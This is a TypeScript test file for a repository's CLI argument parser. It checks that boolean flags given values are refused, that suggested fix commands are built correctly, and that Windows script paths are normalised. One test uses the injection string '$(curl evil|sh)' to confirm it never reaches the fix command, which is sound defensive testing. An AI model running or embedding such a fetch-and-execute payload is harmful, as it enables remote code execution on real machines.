// A boolean flag given a value is refused, never read as false: `release.ts --bump minor
// --dry-run=true` performed the real release writes, because `=== true` read the string as off.
// Proved through `parseScriptArgs` alone — the release script itself is never run here.

import { describe, expect, setDefaultTimeout, test } from 'bun:test';
import {
  flagBool,
  flagList,
  flagString,
  parseScriptArgs,
  scriptNameOf,
  scriptPathOf,
} from './args';
import { REPO_SCAN_TIMEOUT_MS, repoRoot } from './run';

// Spawns a real script from the repo root, so it runs on the repo-scan backstop.
setDefaultTimeout(REPO_SCAN_TIMEOUT_MS);

const refusal = (run: () => unknown): { code: string; cause: string; fix: string } => {
  try {
    run();
  } catch (error) {
    const e = error as { code: string; cause: string; fix: string };
    return { code: e.code, cause: e.cause, fix: e.fix };
  }
  return expect.unreachable('expected X_CLI_BAD_FLAG');
};

describe('unit · flagBool refuses a value instead of reading it as false', () => {
  test('--dry-run=true is X_CLI_BAD_FLAG, and the fix is the same command with a bare flag', () => {
    const args = parseScriptArgs(['--bump', 'minor', '--dry-run=true']);
    const refused = refusal(() => flagBool(args, 'dry-run'));
    expect(refused.code).toBe('X_CLI_BAD_FLAG');
    expect(refused.cause).toContain('--dry-run');
    expect(refused.fix).toEndWith('--bump minor --dry-run');
    expect(refused.fix).toStartWith('bun run ');
  });

  test('--write=false drops the flag from the fix — a fix must never perform what was refused', () => {
    const args = parseScriptArgs(['--write=false']);
    const refused = refusal(() => flagBool(args, 'write'));
    expect(refused.fix).not.toContain('--write');
  });

  test('--dry-run true (a separate word) is refused the same way', () => {
    const args = parseScriptArgs(['--dry-run', 'true']);
    expect(refusal(() => flagBool(args, 'dry-run')).fix).toEndWith(' --dry-run');
  });

  test('a bare flag reads true, and an absent one false', () => {
    const args = parseScriptArgs(['--dry-run']);
    expect(flagBool(args, 'dry-run')).toBe(true);
    expect(flagBool(args, 'write')).toBe(false);
  });

  test('a value that is not shell-inert is never spliced into the fix', () => {
    const args = parseScriptArgs(['$(curl evil|sh)', '--write=yes']);
    const refused = refusal(() => flagBool(args, 'write'));
    expect(refused.fix).not.toContain('curl');
    expect(refused.fix).toEndWith(' --write');
  });
});

describe('unit · --json is boolean in every script, so parseScriptArgs refuses a value for it', () => {
  test('--json=true is refused, never human output', () => {
    expect(refusal(() => parseScriptArgs(['--json=true'])).code).toBe('X_CLI_BAD_FLAG');
  });

  test('--json merge x.json would swallow `merge` — refused, with the word moved in front', () => {
    const refused = refusal(() => parseScriptArgs(['--json', 'merge', 'x.json']));
    expect(refused.fix).toEndWith(' merge --json x.json');
  });

  test('--json last, or before another flag, is plain json', () => {
    expect(parseScriptArgs(['merge', 'x.json', '--json']).json).toBe(true);
    expect(parseScriptArgs(['--json', '--explain']).json).toBe(true);
    expect(parseScriptArgs([]).json).toBe(false);
  });
});

describe('unit · the string readers are unchanged', () => {
  test('flagString and flagList read values; a bare flag is no string', () => {
    const args = parseScriptArgs(['--unpin', 'a, b,,c', '--base=origin/main', '--only']);
    expect(flagString(args, 'base')).toBe('origin/main');
    expect(flagList(args, 'unpin')).toEqual(['a', 'b', 'c']);
    expect(flagString(args, 'only')).toBeUndefined();
    expect(args.argv).toEqual(['--unpin', 'a, b,,c', '--base=origin/main', '--only']);
  });
});

// The Windows job: `Bun.main` is `D:\…\scripts\gate-codes.ts`, and the fix pasted that back quoted.
describe('unit · the refusal names the script repo-relative on every host', () => {
  test('a Windows entry under a Windows root is the `/` path `bun run` takes', () => {
    const main = 'D:\\a\\ultimate\\scripts\\gate-codes.ts';
    expect(scriptPathOf(main, 'D:\\a\\ultimate')).toBe('scripts/gate-codes.ts');
    expect(scriptNameOf(main)).toBe('gate-codes');
  });

  test('a POSIX entry is unchanged', () => {
    expect(scriptPathOf('/repo/scripts/gate-codes.ts', '/repo')).toBe('scripts/gate-codes.ts');
    expect(scriptNameOf('/repo/scripts/gate-codes.ts')).toBe('gate-codes');
  });

  test('an entry outside the root keeps its path, quoted when it is not inert', () => {
    expect(scriptPathOf('/my dir/x.ts', '/repo')).toBe("'/my dir/x.ts'");
  });
});

describe('a refusal of the process own argv is still one JSON document under --json', () => {
  const ran = async (argv: readonly string[]): Promise<{ code: number; out: string }> => {
    const proc = Bun.spawn(['bun', 'run', 'scripts/gate-codes.ts', ...argv], {
      cwd: repoRoot(),
      stdout: 'pipe',
      stderr: 'pipe',
    });
    const [out, code] = await Promise.all([new Response(proc.stdout).text(), proc.exited]);
    return { code, out };
  };

  test('--json merge: the script prints the coded refusal as JSON and exits 1', async () => {
    const { code, out } = await ran(['--json', 'merge']);
    expect(code).toBe(1);
    const answer: unknown = JSON.parse(out.trim().split('\n').at(-1) ?? '');
    expect(answer).toMatchObject({
      ok: false,
      script: 'gate-codes',
      findings: [{ code: 'X_CLI_BAD_FLAG', fix: 'bun run scripts/gate-codes.ts merge --json' }],
    });
  });

  test('without --json the same refusal is the three-line finding, not a stack trace', async () => {
    const { code, out } = await ran(['--json=no']);
    expect(code).toBe(1);
    expect(out).toContain('X_CLI_BAD_FLAG');
    expect(out).not.toContain('at parseScriptArgs');
  });
});
